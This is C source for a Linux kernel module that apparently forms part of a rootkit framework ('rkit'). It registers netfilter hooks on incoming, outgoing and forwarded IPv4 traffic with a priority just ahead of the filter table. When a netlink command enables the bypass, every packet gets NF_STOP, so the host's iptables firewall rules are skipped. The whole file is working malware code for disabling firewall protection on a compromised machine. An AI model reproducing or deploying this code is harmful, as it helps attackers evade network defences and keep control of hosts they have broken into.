#include <linux/netfilter_ipv4.h>
#include <net/netlink.h>

#include "rkit_ext.h"
#include "misc.h"

enum bypass_fw_attr {
    BYPASS_FW_ENABLE,
    __BYPASS_FW_MAX
};
#define BYPASS_FW_MAX (__BYPASS_FW_MAX - 1)


static int bypass_fw = 0;


static void bypass_fw_eval(const struct nlattr * const tb[])
{
    bypass_fw = 1;
}


static unsigned int bypass_fw_hook(HOOK_ARG_TYPE hook_arg,
                                   struct sk_buff *skb,
                                   const struct net_device *in,
                                   const struct net_device *out,
                                   int (*okfn)(struct sk_buff *))
{
    if (bypass_fw) {
        return NF_STOP;
    }
    return NF_ACCEPT;
}


static const struct nla_policy bypass_fw_policy[BYPASS_FW_MAX + 1] = {
    [BYPASS_FW_ENABLE]      = { .type = NLA_U32 },
};


static struct nf_hook_ops bypass_fw_nf_ops[] __read_mostly = {
    {
        .hook     = bypass_fw_hook,
        .owner    = THIS_MODULE,
        .pf       = NFPROTO_IPV4,
        .hooknum  = NF_INET_LOCAL_OUT,
        .priority = NF_IP_PRI_FILTER - 1,
    },
    {
        .hook     = bypass_fw_hook,
        .owner    = THIS_MODULE,
        .pf       = NFPROTO_IPV4,
        .hooknum  = NF_INET_LOCAL_IN,
        .priority = NF_IP_PRI_FILTER - 1,
    },
    {
        .hook     = bypass_fw_hook,
        .owner    = THIS_MODULE,
        .pf       = NFPROTO_IPV4,
        .hooknum  = NF_INET_FORWARD,
        .priority = NF_IP_PRI_FILTER - 1,
    },
};

static struct rkit_ext_ops bypass_fw_ops __read_mostly = {
    .eval = bypass_fw_eval,
};

static struct rkit_ext_type bypass_fw_type __read_mostly = {
    .ops        = &bypass_fw_ops,
    .policy     = bypass_fw_policy,
    .maxattr    = BYPASS_FW_MAX,
    .owner      = THIS_MODULE,
};

void fw_bypass_init(void)
{
    nf_register_hooks(bypass_fw_nf_ops, ARRAY_SIZE(bypass_fw_nf_ops));
    rkit_register_ext(&bypass_fw_type);
}

void fw_bypass_exit(void)
{
    rkit_unregister_ext(&bypass_fw_type);
    nf_unregister_hooks(bypass_fw_nf_ops, ARRAY_SIZE(bypass_fw_nf_ops));
}
